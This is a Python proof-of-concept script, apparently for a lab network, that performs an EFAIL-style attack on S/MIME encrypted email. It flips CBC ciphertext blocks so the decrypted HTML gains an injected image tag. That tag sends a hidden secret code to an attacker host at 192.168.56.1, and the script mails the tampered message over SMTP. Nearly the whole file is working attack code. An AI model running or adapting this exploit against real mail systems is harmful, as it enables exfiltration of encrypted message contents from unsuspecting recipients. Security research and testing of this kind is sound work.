#!/usr/bin/env -S uv run --with asn1crypto python

import os
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import asyncio
import subprocess
import tempfile
from asn1crypto import cms
from asn1crypto import core


def encrypt_email():
    email_content = f"""<html><body>
<h1>Welcome</h1>
<p>We are happy to inform you that you have been selected to receive access to our secret vault.</p>
<p><span style="color: white;">Your personal super secret code: {os.urandom(16).hex()} memorize it before permanently deleting this email!</span></p>
<p>We rely on <b>you</b> to keep the code safe from the evil attacker by any means necessary.</p>
</body></html>"""
    msg = MIMEText(email_content, 'html', 'iso-8859-1')

    # Write the message to a temporary file
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.eml') as temp_msg:
        temp_msg.write(msg.as_string())
        temp_msg_path = temp_msg.name

    encrypted_path = temp_msg_path + '.enc'
    openssl_encrypt_cmd = [
        'openssl', 'smime', '-encrypt',
        '-in', temp_msg_path,
        '-out', encrypted_path,
        '-outform', 'DER',
        '-binary',
        "Single_S_MIME_User_1.crt"
    ]

    subprocess.run(openssl_encrypt_cmd, check=True, capture_output=True)

    with open(encrypted_path, 'rb') as f:
        res = f.read()

    for temp_file in [temp_msg_path, encrypted_path]:
        try:
            os.unlink(temp_file)
        except:
            pass
    return res

def pack_email(base, iv, ct):
    assert base['content_type'].dotted == "1.2.840.113549.1.7.3"
    enveloped_data = base['content']
    encrypted_content_info = enveloped_data['encrypted_content_info']
    content_encryption_algorithm = encrypted_content_info['content_encryption_algorithm']
    algorithm = content_encryption_algorithm['algorithm'].dotted

    assert algorithm in ["2.16.840.1.101.3.4.1.2", "2.16.840.1.101.3.4.1.22", "2.16.840.1.101.3.4.1.42"] # AES CBC (according to some LLM)

    # Create new algorithm identifier with modified IV
    new_algorithm = cms.EncryptionAlgorithm({
        'algorithm': content_encryption_algorithm['algorithm'],
        'parameters': core.OctetString(iv)
    })

    # Create new EncryptedContentInfo
    new_encrypted_content_info = cms.EncryptedContentInfo({
        'content_type': encrypted_content_info['content_type'],
        'content_encryption_algorithm': new_algorithm,
        'encrypted_content': core.OctetString(ct)
    })

    # Create new EnvelopedData
    new_enveloped_data = cms.EnvelopedData({
        'version': enveloped_data['version'],
        'recipient_infos': enveloped_data['recipient_infos'],
        'encrypted_content_info': new_encrypted_content_info
    })

    # Create new ContentInfo
    new_content_info = cms.ContentInfo({
        'content_type': base['content_type'],
        'content': new_enveloped_data
    })

    # Dump the new structure
    encrypted_data = new_content_info.dump()

    # Create final encrypted message
    encrypted_msg = MIMEApplication(encrypted_data, 'pkcs7-mime', name='smime.p7m')
    encrypted_msg['From'] = "pt@tmp.test"
    encrypted_msg['To'] = "smime1@single.test"
    encrypted_msg['Date'] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S %z")
    encrypted_msg['Subject'] = "Secret Code"

    return encrypted_msg

def xor(a, b, c=None):
    assert len(a) == len(b) == 16
    if c is not None:
        b = xor(b, c)
    return bytes(i ^ j for i, j in zip(a, b))

async def main():
    client = smtplib.SMTP("192.168.56.101")

    encrypted = encrypt_email()
    base = cms.ContentInfo.load(encrypted)
    iv = base['content']['encrypted_content_info']['content_encryption_algorithm']['parameters'].contents
    ct = base['content']['encrypted_content_info']['encrypted_content'].contents
    newct = (ct[:144] +
        xor(ct[144:160], b'form you that yo', b'<img dummy="1234') + ct[160:176] +
        xor(ct[176:192], b'cted to receive ', b'" src="http://12') + ct[192:208] +
        xor(ct[272:288], b' super secret co', b'@192.168.56.1/12') + ct[288:304] +
        ct[304:352] +
        xor(ct[352:368], b'ently deleting t', b'" />' + bytes([12]*12)) + ct[368:384]
    )
    msg = pack_email(base, iv, newct)
    client.send_message(msg)
    client.quit()

if __name__ == "__main__":
    asyncio.run(main())
